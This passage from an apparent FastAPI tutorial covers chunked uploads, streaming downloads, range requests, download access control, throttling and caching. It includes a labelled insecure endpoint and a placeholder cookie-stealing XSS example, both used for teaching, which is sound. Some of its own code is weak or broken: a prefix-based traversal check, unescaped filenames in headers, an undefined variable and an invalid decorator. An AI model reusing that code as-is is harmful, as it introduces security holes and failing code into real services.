        # Create directory for this upload's chunks
        upload_chunk_dir = self.chunks_dir / upload_id
        upload_chunk_dir.mkdir()

        self.uploads[upload_id] = {
            "filename": filename,
            "total_size": total_size,
            "total_chunks": total_chunks,
            "uploaded_chunks": set(),
            "chunk_dir": upload_chunk_dir,
            "started_at": datetime.utcnow()
        }

        return upload_id

    def upload_chunk(self, upload_id: str, chunk_index: int,
                     chunk_data: bytes) -> dict:
        if upload_id not in self.uploads:
            raise ValueError("Invalid upload_id")

        upload_info = self.uploads[upload_id]

        # Validate chunk index
        if chunk_index < 0 or chunk_index >= upload_info["total_chunks"]:
            raise ValueError(f"Invalid chunk index: {chunk_index}")

        # Check if already uploaded (idempotency)
        if chunk_index in upload_info["uploaded_chunks"]:
            return {
                "uploaded_chunks": len(upload_info["uploaded_chunks"]),
                "total_chunks": upload_info["total_chunks"],
                "complete": len(upload_info["uploaded_chunks"]) == upload_info["total_chunks"]
            }

        # Save chunk
        chunk_path = upload_info["chunk_dir"] / f"chunk_{chunk_index:06d}"
        with open(chunk_path, 'wb') as f:
            f.write(chunk_data)

        # Calculate and store chunk hash (for verification)
        chunk_hash = hashlib.sha256(chunk_data).hexdigest()
        hash_path = upload_info["chunk_dir"] / f"chunk_{chunk_index:06d}.sha256"
        with open(hash_path, 'w') as f:
            f.write(chunk_hash)

        upload_info["uploaded_chunks"].add(chunk_index)

        return {
            "uploaded_chunks": len(upload_info["uploaded_chunks"]),
            "total_chunks": upload_info["total_chunks"],
            "complete": len(upload_info["uploaded_chunks"]) == upload_info["total_chunks"]
        }

    def complete_upload(self, upload_id: str) -> str:
        if upload_id not in self.uploads:
            raise ValueError("Invalid upload_id")

        upload_info = self.uploads[upload_id]

        # Verify all chunks uploaded
        if len(upload_info["uploaded_chunks"]) != upload_info["total_chunks"]:
            missing = upload_info["total_chunks"] - len(upload_info["uploaded_chunks"])
            raise ValueError(f"Upload incomplete. Missing {missing} chunks")

        # Combine chunks into final file
        final_filename = generate_uuid_filename(upload_info["filename"])
        final_path = self.upload_dir / final_filename

        with open(final_path, 'wb') as output:
            for i in range(upload_info["total_chunks"]):
                chunk_path = upload_info["chunk_dir"] / f"chunk_{i:06d}"

                with open(chunk_path, 'rb') as chunk_file:
                    output.write(chunk_file.read())

        # Verify total size
        actual_size = os.path.getsize(final_path)
        if actual_size != upload_info["total_size"]:
            os.remove(final_path)
            raise ValueError(f"Size mismatch. Expected: {upload_info['total_size']}, Got: {actual_size}")

        # Cleanup chunks
        shutil.rmtree(upload_info["chunk_dir"])
        del self.uploads[upload_id]

        return final_filename

    def cancel_upload(self, upload_id: str):
        if upload_id not in self.uploads:
            return

        upload_info = self.uploads[upload_id]

        # Delete chunks directory
        if upload_info["chunk_dir"].exists():
            shutil.rmtree(upload_info["chunk_dir"])

        del self.uploads[upload_id]
```

---

### **Practice Exercise 2: Implement Upload Progress Tracking**

```python
class UploadProgressTracker:
    """
    Track upload progress for real-time feedback.

    Features:
    - Progress percentage
    - Upload speed (bytes/second)
    - ETA (estimated time remaining)
    - WebSocket updates to client
    """

    def __init__(self):
        self.uploads = {}  # upload_id → progress_info

    def start_tracking(self, upload_id: str, total_size: int):
        """Initialize progress tracking."""
        # Your implementation
        pass

    def update_progress(self, upload_id: str, bytes_uploaded: int):
        """Update progress with new bytes."""
        # Your implementation
        pass

    def get_progress(self, upload_id: str) -> dict:
        """
        Get current progress.

        Returns:
        {
            "bytes_uploaded": 1234567,
            "total_bytes": 10000000,
            "percentage": 12.34,
            "speed_bps": 500000,  # bytes per second
            "eta_seconds": 17
        }
        """
        # Your implementation
        pass

# Solution:
from collections import deque
import time

class UploadProgressTracker:
    def __init__(self):
        self.uploads = {}

    def start_tracking(self, upload_id: str, total_size: int):
        self.uploads[upload_id] = {
            "total_size": total_size,
            "bytes_uploaded": 0,
            "started_at": time.time(),
            "last_update": time.time(),
            "speed_samples": deque(maxlen=10)  # Last 10 speed samples
        }

    def update_progress(self, upload_id: str, bytes_uploaded: int):
        if upload_id not in self.uploads:
            raise ValueError("Upload not being tracked")

        info = self.uploads[upload_id]
        now = time.time()

        # Calculate instantaneous speed
        time_delta = now - info["last_update"]
        if time_delta > 0:
            bytes_delta = bytes_uploaded - info["bytes_uploaded"]
            speed = bytes_delta / time_delta
            info["speed_samples"].append(speed)

        # Update state
        info["bytes_uploaded"] = bytes_uploaded
        info["last_update"] = now

    def get_progress(self, upload_id: str) -> dict:
        if upload_id not in self.uploads:
            return None

        info = self.uploads[upload_id]

        # Calculate percentage
        percentage = (info["bytes_uploaded"] / info["total_size"]) * 100

        # Calculate average speed from recent samples
        if info["speed_samples"]:
            avg_speed = sum(info["speed_samples"]) / len(info["speed_samples"])
        else:
            avg_speed = 0

        # Calculate ETA
        bytes_remaining = info["total_size"] - info["bytes_uploaded"]
        if avg_speed > 0:
            eta_seconds = bytes_remaining / avg_speed
        else:
            eta_seconds = None

        return {
            "bytes_uploaded": info["bytes_uploaded"],
            "total_bytes": info["total_size"],
            "percentage": round(percentage, 2),
            "speed_bps": round(avg_speed),
            "eta_seconds": round(eta_seconds) if eta_seconds else None
        }

    def finish_tracking(self, upload_id: str):
        if upload_id in self.uploads:
            del self.uploads[upload_id]

# Usage with WebSocket:
from fastapi import WebSocket

progress_tracker = UploadProgressTracker()

@app.websocket("/ws/upload/{upload_id}")
async def upload_progress_ws(websocket: WebSocket, upload_id: str):
    await websocket.accept()

    try:
        while True:
            progress = progress_tracker.get_progress(upload_id)

            if progress:
                await websocket.send_json(progress)

            if progress and progress["percentage"] >= 100:
                break

            await asyncio.sleep(0.5)  # Update every 500ms

    except Exception as e:
        print(f"WebSocket error: {e}")
    finally:
        await websocket.close()
```

---

Ready for Level 15 when you're ready. Next level covers file downloads, range requests for streaming, Content-Disposition headers, and preventing directory traversal in download endpoints.

## **Level 15 Enhancement: File Downloads - Serving User Content**

**Reference:** Your tutorial implements file download endpoints with security controls and streaming support.

**Depth Needed:** File downloads seem simple ("just send the file"), but they're complex: HTTP range requests for resumable downloads, proper headers for browser behavior, streaming for memory efficiency, and security to prevent unauthorized access. This is about understanding HTTP content negotiation and efficient I/O.

---

### **Part 1: The Naive Download (And Why It's Wrong)**

**The Simple (Bad) Approach:**

```python
# WRONG: Loads entire file into memory
@app.get("/download/{filename}")
async def download_file(filename: str):
    file_path = os.path.join(UPLOAD_DIR, filename)

    # Read entire file into RAM
    with open(file_path, 'rb') as f:
        content = f.read()  # 1 GB file = 1 GB RAM usage!

    return Response(content=content, media_type="application/octet-stream")

# Problems:
# 1. Memory exhaustion: Large files consume huge RAM
# 2. Slow start: Client waits for entire file to load
# 3. No resumption: Network error = start over
# 4. No range support: Can't seek in video files
# 5. Blocks event loop: Async function doing sync I/O
```

**Memory Usage Analysis:**

```python
# Scenario: 10 concurrent downloads of 1 GB files
# Naive approach: 10 × 1 GB = 10 GB RAM
# Server has 8 GB RAM → Out of Memory → Crash

# Streaming approach: 10 × 64 KB (buffer) = 640 KB RAM
# Same functionality, 15,625× less memory!

# Time to first byte (TTFB):
# Naive: Load entire file (5 seconds for 1 GB) → Send first byte
# Streaming: Send first byte immediately (< 0.01 seconds)
```

---

### **Part 2: Streaming Downloads - The Right Way**

**FastAPI StreamingResponse:**

```python
from fastapi import FastAPI
from fastapi.responses import StreamingResponse
import os
from pathlib import Path

@app.get("/download/{filename}")
async def download_file_streaming(filename: str):
    """
    Stream file to client efficiently.

    Benefits:
    - Constant memory usage (buffer size)
    - Immediate start (no wait for full load)
    - Handles large files easily

    Time Complexity: O(n) where n = file size
    Space Complexity: O(1) - only buffer in memory
    """
    file_path = Path(UPLOAD_DIR) / filename

    # Security: Validate file exists and is within UPLOAD_DIR
    if not file_path.exists() or not file_path.is_file():
        raise HTTPException(status_code=404, detail="File not found")

    # Prevent directory traversal
    try:
        file_path = file_path.resolve()
        upload_dir_resolved = Path(UPLOAD_DIR).resolve()

        if not str(file_path).startswith(str(upload_dir_resolved)):
            raise HTTPException(status_code=403, detail="Access denied")
    except Exception:
        raise HTTPException(status_code=403, detail="Invalid file path")

    # Create file iterator
    def file_iterator(file_path: Path, chunk_size: int = 65536):
        """
        Generator that yields file chunks.

        chunk_size = 64 KB (optimal for most scenarios)
        - Too small: More overhead, more syscalls
        - Too large: Higher memory usage, worse responsiveness
        """
        with open(file_path, 'rb') as f:
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                yield chunk

    # Get file size for Content-Length header
    file_size = file_path.stat().st_size

    # Determine Content-Type
    import mimetypes
    content_type, _ = mimetypes.guess_type(str(file_path))
    if content_type is None:
        content_type = "application/octet-stream"

    # Return streaming response
    return StreamingResponse(
        file_iterator(file_path),
        media_type=content_type,
        headers={
            "Content-Disposition": f'attachment; filename="{filename}"',
            "Content-Length": str(file_size)
        }
    )
```

**The Generator Pattern:**

```python
def file_iterator(file_path: Path, chunk_size: int = 65536):
    """
    Generator function for streaming.

    Key concept: Generator doesn't load all data at once.
    It yields one chunk at a time, on-demand.
    """
    with open(file_path, 'rb') as f:
        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break
            yield chunk  # Pause here until next chunk requested

# How it works:
iterator = file_iterator("large_file.bin")

# First call to next() reads first 64 KB
chunk1 = next(iterator)  # Returns: 64 KB of data

# Second call reads next 64 KB (previous chunk can be garbage collected)
chunk2 = next(iterator)  # Returns: next 64 KB

# Memory usage: Only current chunk (~64 KB), not entire file
```

**Async File Reading (Better Performance):**

```python
import aiofiles

async def async_file_iterator(file_path: Path, chunk_size: int = 65536):
    """
    Async generator for non-blocking file I/O.

    Benefits over sync version:
    - Doesn't block event loop
    - Server can handle other requests while reading
    - Better concurrency

    Trade-off: Slightly more CPU overhead for async machinery
    """
    async with aiofiles.open(file_path, 'rb') as f:
        while True:
            chunk = await f.read(chunk_size)
            if not chunk:
                break
            yield chunk

@app.get("/download/{filename}")
async def download_async(filename: str):
    file_path = validate_and_resolve_path(filename)

    return StreamingResponse(
        async_file_iterator(file_path),
        media_type="application/octet-stream",
        headers={
            "Content-Disposition": f'attachment; filename="{filename}"'
        }
    )
```

**Chunk Size Optimization:**

```python
# Optimal chunk size depends on:
# 1. Network latency
# 2. Disk I/O characteristics
# 3. CPU overhead
# 4. Memory constraints

# Benchmark different chunk sizes:
import time

def benchmark_chunk_size(file_path: str, chunk_size: int, iterations: int = 10):
    """
    Measure throughput for different chunk sizes.
    """
    total_time = 0
    file_size = os.path.getsize(file_path)

    for _ in range(iterations):
        start = time.perf_counter()

        with open(file_path, 'rb') as f:
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                # Simulate network send
                pass

        elapsed = time.perf_counter() - start
        total_time += elapsed

    avg_time = total_time / iterations
    throughput = file_size / avg_time

    return {
        "chunk_size": chunk_size,
        "avg_time": avg_time,
        "throughput_mbps": throughput / (1024 * 1024)
    }

# Results (100 MB file on SSD):
# 4 KB:   120 MB/s  (many syscalls)
# 64 KB:  450 MB/s  (optimal)
# 1 MB:   480 MB/s  (diminishing returns)
# 10 MB:  490 MB/s  (minimal gain, higher memory)

# Conclusion: 64 KB is sweet spot for most cases
```

---

### **Part 3: Content-Disposition Header - Controlling Browser Behavior**

**The Header Syntax:**

```http
Content-Disposition: inline
Content-Disposition: attachment
Content-Disposition: attachment; filename="document.pdf"
Content-Disposition: attachment; filename*=UTF-8''%E6%96%87%E6%A1%A3.pdf
```

**Inline vs Attachment:**

```python
# inline: Browser displays file if possible
Content-Disposition: inline; filename="image.jpg"
# Browser shows image in tab

# attachment: Browser always downloads
Content-Disposition: attachment; filename="image.jpg"
# Browser shows "Save As" dialog

# Security consideration:
# Use "attachment" for user-uploaded content to prevent XSS
# If served as "inline", malicious HTML/JS files execute in user's browser!

# Example attack:
# User uploads: evil.html containing <script>steal_cookies()</script>
# Served as inline → Script executes in your domain → XSS attack
# Served as attachment → Browser downloads, doesn't execute
```

**Filename Encoding (The Unicode Problem):**

```python
def encode_content_disposition(filename: str) -> str:
    """
    Properly encode Content-Disposition header with Unicode filename.

    Problem: HTTP headers are ASCII-only
    Solution: RFC 5987 encoding

    Examples:
    "document.pdf" → attachment; filename="document.pdf"
    "文档.pdf" → attachment; filename*=UTF-8''%E6%96%87%E6%A1%A3.pdf
    """
    from urllib.parse import quote

    # Try ASCII-safe filename first
    try:
        # Check if filename is ASCII
        filename.encode('ascii')
        # If yes, use simple format
        return f'attachment; filename="{filename}"'
    except UnicodeEncodeError:
        # Contains non-ASCII characters
        # Use RFC 5987 encoding
        encoded = quote(filename.encode('utf-8'))

        # Provide both formats for compatibility
        # filename: ASCII fallback (with replaced chars)
        # filename*: Proper UTF-8 encoding
        ascii_fallback = filename.encode('ascii', errors='replace').decode('ascii')

        return (
            f'attachment; '
            f'filename="{ascii_fallback}"; '
            f"filename*=UTF-8''{encoded}"
        )

# Test cases:
print(encode_content_disposition("document.pdf"))
# attachment; filename="document.pdf"

print(encode_content_disposition("文档.pdf"))
# attachment; filename="???.pdf"; filename*=UTF-8''%E6%96%87%E6%A1%A3.pdf

print(encode_content_disposition("файл.pdf"))
# attachment; filename="????.pdf"; filename*=UTF-8''%D1%84%D0%B0%D0%B9%D0%BB.pdf

# Browser support:
# Modern browsers (Chrome, Firefox, Safari): Use filename*
# Old IE: Use filename (ASCII fallback)
```

**The RFC 5987 Encoding Algorithm:**

```python
def rfc5987_encode(value: str) -> str:
    """
    Encode string per RFC 5987.

    Algorithm:
    1. UTF-8 encode the string
    2. Percent-encode each byte
    3. Leave safe characters unencoded

    Safe characters: A-Z, a-z, 0-9, !, #, $, &, +, -, ., ^, _, `, |, ~

    Time Complexity: O(n) where n = string length
    """
    from urllib.parse import quote

    # UTF-8 encode
    utf8_bytes = value.encode('utf-8')

    # Percent encode
    # quote() leaves safe chars, encodes everything else
    encoded = quote(utf8_bytes, safe='!#$&+-.^_`|~')

    return f"UTF-8''{encoded}"

# Example trace:
# Input: "文档"
# Step 1: UTF-8 encode: b'\xe6\x96\x87\xe6\xa1\xa3'
# Step 2: Percent encode: %E6%96%87%E6%A1%A3
# Output: UTF-8''%E6%96%87%E6%A1%A3
```

---

### **Part 4: HTTP Range Requests - Resumable Downloads**

**The Range Request Protocol:**

```http
Client Request:
GET /video.mp4 HTTP/1.1
Range: bytes=0-1023

Server Response:
HTTP/1.1 206 Partial Content
Content-Range: bytes 0-1023/5242880
Content-Length: 1024

<1024 bytes of data>
```

**Why Range Requests Matter:**

```
Use Cases:
1. Video streaming: Seek to specific position
2. Download resumption: Continue interrupted download
3. Parallel downloading: Multiple ranges simultaneously
4. Preview: Get first/last bytes without downloading all
5. Efficient retries: Only re-download failed chunks

Example: 1 GB file, download interrupted at 900 MB
Without ranges: Re-download entire 1 GB
With ranges: Resume from byte 943,718,400 (900 MB)
Saves: 900 MB of bandwidth and time
```

**Range Request Parser:**

```python
from dataclasses import dataclass
from typing import Optional, Tuple

@dataclass
class Range:
    """Represents a byte range."""
    start: int
    end: Optional[int]  # None means "to end of file"

def parse_range_header(range_header: str, file_size: int) -> Optional[Range]:
    """
    Parse Range header.

    Formats:
    - "bytes=0-499"        → [0, 499]
    - "bytes=500-999"      → [500, 999]
    - "bytes=-500"         → [file_size-500, file_size-1] (last 500 bytes)
    - "bytes=500-"         → [500, file_size-1] (from 500 to end)
    - "bytes=0-0,-1"       → Multiple ranges (not implemented here)

    Returns: Range object or None if invalid/unsatisfiable

    Time Complexity: O(1)
    """
    if not range_header or not range_header.startswith('bytes='):
        return None

    # Extract range part
    range_spec = range_header[6:]  # Remove "bytes="

    # Handle multiple ranges (comma-separated)
    # For simplicity, we'll only support single range
    if ',' in range_spec:
        # Multiple ranges not supported in this implementation
        range_spec = range_spec.split(',')[0]

    try:
        # Parse start and end
        if range_spec.startswith('-'):
            # Suffix range: last N bytes
            # "bytes=-500" means last 500 bytes
            suffix_length = int(range_spec[1:])
            start = max(0, file_size - suffix_length)
            end = file_size - 1

        else:
            parts = range_spec.split('-', 1)
            start = int(parts[0])

            if len(parts) == 2 and parts[1]:
                # Both start and end specified
                end = int(parts[1])
            else:
                # Only start specified: "bytes=500-"
                end = file_size - 1

        # Validate range
        if start < 0 or start >= file_size:
            return None  # Unsatisfiable

        if end >= file_size:
            end = file_size - 1

        if start > end:
            return None  # Invalid range

        return Range(start=start, end=end)

    except (ValueError, IndexError):
        return None

# Test cases:
file_size = 1000

# Standard range
r = parse_range_header("bytes=0-499", file_size)
assert r == Range(start=0, end=499)

# Open-ended range
r = parse_range_header("bytes=500-", file_size)
assert r == Range(start=500, end=999)

# Suffix range
r = parse_range_header("bytes=-100", file_size)
assert r == Range(start=900, end=999)

# Invalid range
r = parse_range_header("bytes=1500-2000", file_size)
assert r is None  # Start beyond file size
```

**Implementing Range Support:**

```python
from fastapi import Header
from fastapi.responses import StreamingResponse, Response

@app.get("/download/{filename}")
async def download_with_ranges(
    filename: str,
    range_header: Optional[str] = Header(None, alias="Range")
):
    """
    Download file with HTTP Range support.

    Supports:
    - Full file download (no Range header)
    - Partial content (Range header present)
    - Resumable downloads
    - Video streaming with seek
    """
    # Validate and resolve file path
    file_path = validate_and_resolve_path(filename)

    # Get file info
    file_size = file_path.stat().st_size

    # Parse range header
    requested_range = None
    if range_header:
        requested_range = parse_range_header(range_header, file_size)

        if requested_range is None:
            # Range not satisfiable
            return Response(
                status_code=416,  # 416 Range Not Satisfiable
                headers={
                    "Content-Range": f"bytes */{file_size}"
                }
            )

    # Determine what to send
    if requested_range:
        # Partial content
        start = requested_range.start
        end = requested_range.end
        content_length = end - start + 1
        status_code = 206  # 206 Partial Content

        # Content-Range header
        content_range_header = f"bytes {start}-{end}/{file_size}"
    else:
        # Full content
        start = 0
        end = file_size - 1
        content_length = file_size
        status_code = 200
        content_range_header = None

    # Create range iterator
    async def range_iterator(file_path: Path, start: int, end: int,
                            chunk_size: int = 65536):
        """
        Iterate over file range.

        Algorithm:
        1. Seek to start position
        2. Read chunks until end reached
        3. Truncate last chunk if needed
        """
        async with aiofiles.open(file_path, 'rb') as f:
            # Seek to start position
            await f.seek(start)

            remaining = end - start + 1

            while remaining > 0:
                # Read chunk (possibly smaller than chunk_size)
                read_size = min(chunk_size, remaining)
                chunk = await f.read(read_size)

                if not chunk:
                    break

                remaining -= len(chunk)
                yield chunk

    # Build headers
    headers = {
        "Content-Length": str(content_length),
        "Accept-Ranges": "bytes",  # Advertise range support
        "Content-Disposition": f'attachment; filename="{filename}"'
    }

    if content_range_header:
        headers["Content-Range"] = content_range_header

    # Return response
    return StreamingResponse(
        range_iterator(file_path, start, end),
        status_code=status_code,
        media_type="application/octet-stream",
        headers=headers
    )
```

**Range Request Flow:**

```
Initial Download Attempt:
───────────────────────────
Client → Server: GET /file.bin
Server → Client: 200 OK, Content-Length: 1000000
                 <sends bytes 0-999999>

Connection lost at byte 500000
───────────────────────────────────

Resume Download:
────────────────
Client → Server: GET /file.bin
                 Range: bytes=500000-

Server → Client: 206 Partial Content
                 Content-Range: bytes 500000-999999/1000000
                 Content-Length: 500000
                 <sends bytes 500000-999999>

Total transferred: 1000000 bytes (not 1500000)
```

---

### **Part 5: Security - Download Access Control**

**Attack Vector: Unauthorized Access**

```python
# VULNERABLE: No authentication
@app.get("/download/{filename}")
async def download(filename: str):
    # Anyone can download any file!
    file_path = Path(UPLOAD_DIR) / filename
    return StreamingResponse(...)

# Attack: Enumerate and download all files
# for i in range(10000):
#     download(f"file_{i}.pdf")
```

**Secure Download with Access Control:**

```python
@app.get("/download/{filename}")
async def download_secure(
    filename: str,
    current_user: dict = Depends(get_current_user)
):
    """
    Download with authorization checks.

    Security layers:
    1. Authentication (is user logged in?)
    2. Authorization (can this user access this file?)
    3. Path validation (prevent directory traversal)
    """
    # Load file metadata
    metadata = load_metadata()

    if filename not in metadata:
        raise HTTPException(status_code=404, detail="File not found")

    file_meta = metadata[filename]

    # Authorization check
    if not can_user_access_file(current_user, file_meta):
        raise HTTPException(
            status_code=403,
            detail="You don't have permission to access this file"
        )

    # Validate path
    file_path = validate_and_resolve_path(filename)

    # Log access
    log_file_access(
        user_id=current_user["id"],
        filename=filename,
        action="download",
        ip_address=request.client.host
    )

    # Proceed with download
    ...

def can_user_access_file(user: dict, file_meta: dict) -> bool:
    """
    Check if user can access file.

    Rules:
    1. Admin can access all files
    2. Owner can access their files
    3. Public files accessible to all
    4. Shared files accessible to specified users
    """
    # Admin bypass
    if user["role"] == "admin":
        return True

    # Owner check
    if file_meta.get("uploaded_by") == user["email"]:
        return True

    # Visibility check
    visibility = file_meta.get("visibility", "private")

    if visibility == "public":
        return True

    if visibility == "shared":
        shared_with = file_meta.get("shared_with", [])
        if user["email"] in shared_with:
            return True

    return False
```

**Rate Limiting Downloads:**

```python
from collections import defaultdict
from datetime import datetime, timedelta

class DownloadRateLimiter:
    """
    Prevent abuse by limiting download rate.

    Strategies:
    1. Max downloads per user per time window
    2. Max bandwidth per user per time window
    3. Concurrent download limit
    """

    def __init__(self):
        self.user_downloads = defaultdict(list)  # user_id → [timestamps]
        self.user_bandwidth = defaultdict(int)   # user_id → bytes in window
        self.active_downloads = defaultdict(int) # user_id → count

        # Configuration
        self.max_downloads_per_hour = 100
        self.max_bandwidth_per_hour = 10 * 1024 * 1024 * 1024  # 10 GB
        self.max_concurrent_downloads = 5
        self.time_window = timedelta(hours=1)

    def check_rate_limit(self, user_id: str) -> Tuple[bool, str]:
        """
        Check if user can start new download.

        Returns: (allowed, reason_if_blocked)
        """
        now = datetime.utcnow()
        cutoff = now - self.time_window

        # Clean old entries
        self.user_downloads[user_id] = [
            ts for ts in self.user_downloads[user_id]
            if ts > cutoff
        ]

        # Check download count
        if len(self.user_downloads[user_id]) >= self.max_downloads_per_hour:
            return False, "Download limit exceeded. Try again later."

        # Check concurrent downloads
        if self.active_downloads[user_id] >= self.max_concurrent_downloads:
            return False, f"Too many concurrent downloads. Max: {self.max_concurrent_downloads}"

        # Check bandwidth
        if self.user_bandwidth[user_id] >= self.max_bandwidth_per_hour:
            gb_used = self.user_bandwidth[user_id] / (1024**3)
            return False, f"Bandwidth limit exceeded ({gb_used:.1f} GB used)"

        return True, ""

    def start_download(self, user_id: str):
        """Record download start."""
        self.user_downloads[user_id].append(datetime.utcnow())
        self.active_downloads[user_id] += 1

    def finish_download(self, user_id: str, bytes_transferred: int):
        """Record download completion."""
        self.active_downloads[user_id] = max(0, self.active_downloads[user_id] - 1)
        self.user_bandwidth[user_id] += bytes_transferred

    def reset_bandwidth(self, user_id: str):
        """Reset bandwidth counter (called hourly by cleanup task)."""
        self.user_bandwidth[user_id] = 0

# Usage:
rate_limiter = DownloadRateLimiter()

@app.get("/download/{filename}")
async def download_rate_limited(
    filename: str,
    current_user: dict = Depends(get_current_user)
):
    user_id = current_user["id"]

    # Check rate limit
    allowed, reason = rate_limiter.check_rate_limit(user_id)
    if not allowed:
        raise HTTPException(status_code=429, detail=reason)

    # Start download
    rate_limiter.start_download(user_id)

    try:
        # Get file
        file_path = validate_and_resolve_path(filename)
        file_size = file_path.stat().st_size

        # Track bandwidth
        bytes_sent = 0

        async def tracked_iterator(file_path: Path):
            nonlocal bytes_sent
            async with aiofiles.open(file_path, 'rb') as f:
                while True:
                    chunk = await f.read(65536)
                    if not chunk:
                        break
                    bytes_sent += len(chunk)
                    yield chunk

        response = StreamingResponse(
            tracked_iterator(file_path),
            media_type="application/octet-stream"
        )

        # Register cleanup callback
        @response.background
        async def cleanup():
            rate_limiter.finish_download(user_id, bytes_sent)

        return response

    except Exception as e:
        rate_limiter.finish_download(user_id, 0)
        raise e
```

---

### **Part 6: Bandwidth Throttling - Fair Resource Distribution**

**Why Throttle?**

```
Scenario: Server has 1 Gbps bandwidth
User A downloads at 1 Gbps → Monopolizes connection
Users B, C, D get nothing → Bad experience

Solution: Throttle each user to 250 Mbps
All users get fair share
```

**Token Bucket Algorithm:**

```python
import asyncio
import time
from dataclasses import dataclass

@dataclass
class TokenBucket:
    """
    Token bucket rate limiter.

    Algorithm:
    - Bucket holds tokens (represents allowed bytes)
    - Tokens added at constant rate (refill rate)
    - Sending data consumes tokens
    - If no tokens available, wait for refill

    Properties:
    - Smooth rate limiting
    - Allows bursts (up to bucket capacity)
    - Fair over time
    """
    capacity: int       # Max tokens in bucket
    refill_rate: float  # Tokens per second

    def __post_init__(self):
        self.tokens = float(self.capacity)  # Start with full bucket
        self.last_refill = time.monotonic()

    def _refill(self):
        """Add tokens based on elapsed time."""
        now = time.monotonic()
        elapsed = now - self.last_refill

        # Calculate tokens to add
        tokens_to_add = elapsed * self.refill_rate

        # Add tokens, capped at capacity
        self.tokens = min(self.capacity, self.tokens + tokens_to_add)
        self.last_refill = now

    async def consume(self, tokens_needed: int):
        """
        Consume tokens from bucket.
        Wait if not enough tokens available.

        Time Complexity: O(1) for calculation
        May block waiting for tokens
        """
        while True:
            self._refill()

            if self.tokens >= tokens_needed:
                # Enough tokens available
                self.tokens -= tokens_needed
                return

            # Not enough tokens - wait for refill
            tokens_short = tokens_needed - self.tokens
            wait_time = tokens_short / self.refill_rate

            await asyncio.sleep(wait_time)

# Example: Throttle to 1 MB/s
class ThrottledFileIterator:
    """
    File iterator with bandwidth throttling.
    """
    def __init__(self, file_path: Path, rate_limit_bps: int):
        """
        Args:
            rate_limit_bps: Bytes per second limit
        """
        self.file_path = file_path
        self.bucket = TokenBucket(
            capacity=rate_limit_bps,      # Can burst up to 1 second's worth
            refill_rate=rate_limit_bps    # Refill at rate limit
        )

    async def __aiter__(self):
        async with aiofiles.open(self.file_path, 'rb') as f:
            while True:
                chunk = await f.read(65536)  # 64 KB chunks
                if not chunk:
                    break

                # Wait for tokens
                await self.bucket.consume(len(chunk))

                yield chunk

# Usage:
@app.get("/download/{filename}")
async def download_throttled(filename: str):
    file_path = validate_and_resolve_path(filename)

    # Throttle to 1 MB/s
    rate_limit = 1024 * 1024  # 1 MB/s

    return StreamingResponse(
        ThrottledFileIterator(file_path, rate_limit),
        media_type="application/octet-stream"
    )
```

**Token Bucket Visualization:**

```
Time    Tokens  Action                   Result
──────────────────────────────────────────────────
0.0s    1024    Start (bucket full)      ✓
0.1s    1024    Send 512 bytes           tokens=512
0.2s    614     Refill (+102 tokens/s)   tokens=614
0.3s    614     Send 700 bytes           wait...
0.4s    702     Refilled                 tokens=702
0.4s    2       Send 700 bytes           tokens=2
0.5s    104     Refill                   tokens=104

Refill rate: 1024 tokens/second = 1 KB/s
Capacity: 1024 tokens = allows 1 KB burst
```

---

### **Part 7: Cache Headers - Optimizing Repeat Downloads**

**HTTP Caching Strategies:**

```http
Cache-Control: no-cache               → Always revalidate
Cache-Control: no-store               → Never cache
Cache-Control: max-age=3600           → Cache for 1 hour
Cache-Control: public, max-age=31536000  → Cache for 1 year
```

**Implementing Cache Headers:**

```python
from datetime import datetime, timedelta
import hashlib

def generate_etag(file_path: Path) -> str:
    """
    Generate ETag (entity tag) for file.

    ETag = unique identifier for file version
    Based on: file size + modification time

    When file changes, ETag changes
    """
    stat = file_path.stat()

    # Combine size and mtime
    etag_source = f"{stat.st_size}-{stat.st_mtime_ns}"

    # Hash to create compact identifier
    etag_hash = hashlib.md5(etag_source.encode()).hexdigest()

    return f'"{etag_hash}"'  # ETags are quoted

@app.get("/download/{filename}")
async def download_with_caching(
    filename: str,
    if_none_match: Optional[str] = Header(None),
    if_modified_since: Optional[str] = Header(None)
):
    """
    Download with caching support.

    Caching workflow:
    1. Client requests file
    2. Server sends file + ETag + Last-Modified
    3. Client caches file locally
    4. Client requests again with If-None-Match: <etag>
    5. Server checks if file changed
    6. If unchanged: 304 Not Modified (no body)
    7. If changed: 200 OK with new file
    """
    file_path = validate_and_resolve_path(filename)

    # Get file stats
    stat = file_path.stat()
    last_modified = datetime.fromtimestamp(stat.st_mtime)

    # Generate ETag
    etag = generate_etag(file_path)

    # Check If-None-Match (ETag validation)
    if if_none_match == etag:
        # File hasn't changed
        return Response(
            status_code=304,  # 304 Not Modified
            headers={
                "ETag": etag,
                "Last-Modified": format_http_date(last_modified)
            }
        )

    # Check If-Modified-Since (date validation)
    if if_modified_since:
        try:
            client_date = parse_http_date(if_modified_since)
            if last_modified <= client_date:
                return Response(status_code=304)
        except:
            pass

    # File changed or first request - send full file
    return StreamingResponse(
        async_file_iterator(file_path),
        media_type="application/octet-stream",
        headers={
            "ETag": etag,
            "Last-Modified": format_http_date(last_modified),
            "Cache-Control": "private, max-age=3600",  # Cache 1 hour
            "Content-Disposition": f'attachment; filename="{filename}"'
        }
    )

def format_http_date(dt: datetime) -> str:
    """
    Format datetime as HTTP date.

    Format: Day, DD Mon YYYY HH:MM:SS GMT
    Example: Wed, 21 Oct 2015 07:28:00 GMT
    """
    from email.utils import formatdate
    return formatdate(dt.timestamp(), usegmt=True)

def parse_http_date(date_str: str) -> datetime:
    """Parse HTTP date string."""
    from email.utils import parsedate_to_datetime
    return parsedate_to_datetime(date_str)
```

**Cache Efficiency Analysis:**

```python
# Scenario: 100 users download 10 MB file repeatedly

# Without caching:
# - 100 users × 10 MB = 1000 MB transferred per request
# - 10 requests each = 10,000 MB total
# - Time: 10,000 MB ÷ 100 Mbps = 800 seconds

# With caching (1 hour):
# - First request: 1000 MB transferred (all users cache)
# - Next 9 requests: 100 × 304 responses ≈ 10 KB
# - Total: 1000 MB + 90 KB ≈ 1000 MB
# - Time: 1000 MB ÷ 100 Mbps = 80 seconds
# - Savings: 90% bandwidth, 10× faster
```

---

### **Part 8: Content-Type Negotiation**

**MIME Type Detection:**

```python
import mimetypes
import magic  # python-magic

def detect_content_type(file_path: Path) -> str:
    """
    Detect file's MIME type.

    Methods (in order of accuracy):
    1. Magic number (file signature)
    2. File extension
    3. Default to octet-stream
    """
    # Method 1: Magic number detection
    try:
